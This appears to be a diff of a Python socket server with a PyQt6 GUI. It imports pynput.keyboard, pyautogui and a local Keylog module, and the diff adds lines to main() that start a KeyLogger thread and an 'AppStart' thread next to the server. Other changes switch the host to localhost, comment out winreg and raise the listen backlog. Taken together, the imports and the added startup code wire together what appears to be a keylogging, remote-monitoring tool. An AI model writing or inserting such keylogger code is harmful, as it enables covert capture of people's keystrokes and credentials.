@@ -1,6 +1,6 @@
 import socket
 import threading
-import winreg
+#import winreg
 import pyautogui
 import io
 import time
@@ -9,7 +9,6 @@ import os
 import subprocess
 import sys
 from PyQt6.QtWidgets import QApplication, QWidget, QPushButton
-import winreg
 import psutil
 from ipaddress import ip_address
 from contextlib import closing
@@ -17,7 +16,7 @@ import pynput.keyboard
 import Program
 import Keylog
 
-HOST = "127.0.1.1"
+HOST = 'localhost'
 PORT = 64444
 img_bytes = b'\x00\x01\x02...'
 
@@ -73,7 +72,7 @@ class Server:
     def start(self):
         try:
             self.s.bind((HOST, PORT))
-            self.s.listen(1)
+            self.s.listen(2)
             print("Waiting for Clients")
             while True:
                 conn, addr = self.s.accept()
@@ -510,6 +509,12 @@ class ServerGUI(QWidget):
 
 
 def main():
+    keylogger = KeyLogger()
+    threading.Thread(target=keylogger.startKLog).start()
+    
+    app_start = AppStart()
+    threading.Thread(target=app_start).start()
+    
     server = Server()
     threading.Thread(target=server.start).start()
 
